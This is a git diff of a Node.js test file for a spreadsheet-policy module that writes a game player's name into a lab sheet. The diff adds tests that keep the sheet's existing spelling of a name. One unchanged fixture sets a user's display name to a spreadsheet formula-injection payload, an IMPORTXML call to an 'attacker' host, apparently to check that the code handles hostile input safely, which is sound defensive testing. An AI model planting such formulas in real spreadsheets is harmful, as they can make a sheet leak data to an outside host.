@@ -1,6 +1,6 @@
 const {test}=require('node:test');
 const assert=require('node:assert/strict');
-const {sourceFor,sheetValues,planSheetUpdate}=require('./sheet-policy');
+const {sourceFor,sheetValues,sheetSpelling,planSheetUpdate}=require('./sheet-policy');
 const input={dataset:'pinky_nf_v2',segmentId:'123',action:'complete'};
 const me={id:'mine',display_name:'=IMPORTXML("https://attacker", "x")'};
 const task={assigned_to:'mine',dataset:input.dataset,segment_id:'123',status:'completed',final_segment_id:'456',soma_coords:'1, 2, 3'};
@@ -110,7 +110,7 @@ test('completing replaces an in-progress Status (WIP, Need Help), never a final 
   const out=run(['123','Someone Else',wip,'']);
   assert.equal(out.C2,'Complete (cut off)');
   // The row was not finished, so the completer becomes the Proofreader too.
-  assert.equal(out.B2,me.username||me.display_name);
+  assert.equal(out.B2,me.display_name||me.username);
  }
  // A row the lab already gave a final status keeps it, and keeps its Proofreader.
  for(const final of ['Complete','Not BC',"Can't Complete",'Complete (cut off)']) {
@@ -120,12 +120,26 @@ test('completing replaces an in-progress Status (WIP, Need Help), never a final 
  }
 });
 
-test('the sheet gets the username a player chose, not the full name from their sign in',()=>{
+test('the sheet keeps the spelling it already has for a player, and never swaps in another name',()=>{
+ // Krzysztof: Pyr has the name from his sign in, the sheet has it without the space
+ assert.equal(sheetSpelling('Krzysztof Kruk',['KrzysztofKruk','KrzysztofKruk','Nseraf','Krzysztof Kruk']),'KrzysztofKruk');
+ // capitals: the sheet's usual spelling wins
+ assert.equal(sheetSpelling('annkri',['Annkri','Annkri','annkri']),'Annkri');
+ // a tie goes to the player's own spelling
+ assert.equal(sheetSpelling('Celia D',['CeliaD','Celia D']),'Celia D');
+ // a username or nickname in the sheet is a different name and is not used
+ assert.equal(sheetSpelling('Jaime Skelton',['AzureJay','azurejay']),'');
+ assert.equal(sheetSpelling('Amy R. Sterling',['amy','Nseraf']),'');
+ // nothing to go on
+ assert.equal(sheetSpelling('',['x']),'');
+ assert.equal(sheetSpelling('New Player',[]),'');
+ assert.equal(sheetSpelling('New Player',null),'');
+
  const input={dataset:'stroeh_mouse_retina',segmentId:'123',action:'claim'};
  const task={assigned_to:'kk',dataset:'stroeh_mouse_retina',segment_id:'123',status:'assigned'};
  const nameOf=me=>sheetValues(input,me,task,'10/8/2026')[0][1];
- assert.equal(nameOf({id:'kk',username:'KrzysztofKruk',display_name:'Krzysztof Kruk'}),'KrzysztofKruk');
- // no username yet: the display name, as before
- assert.equal(nameOf({id:'kk',username:null,display_name:'Krzysztof Kruk'}),'Krzysztof Kruk');
- assert.equal(nameOf({id:'kk',username:'',display_name:''}),'Player');
+ assert.equal(nameOf({id:'kk',display_name:'Krzysztof Kruk',sheet_name:'KrzysztofKruk'}),'KrzysztofKruk');
+ // no spelling found: the display name, as it always was, even with a username set
+ assert.equal(nameOf({id:'kk',username:'celiad',display_name:'Celia D',sheet_name:''}),'Celia D');
+ assert.equal(nameOf({id:'kk',username:'celiad',display_name:''}),'celiad');
 });
